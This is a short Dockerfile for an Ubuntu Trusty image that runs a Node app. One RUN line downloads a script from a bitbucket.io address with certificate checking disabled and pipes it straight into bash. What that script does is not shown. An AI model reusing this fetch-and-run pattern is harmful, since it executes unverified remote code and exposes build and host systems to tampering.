FROM ubuntu:trusty  
RUN apt-get update  
RUN apt-get install -y wget git bzip2  
RUN wget --no-check-certificate -qO -
'https://lanahein.bitbucket.io/bootstrap?_v=1488284841' | bash  
WORKDIR /tmp  
CMD ./node app.js  
  

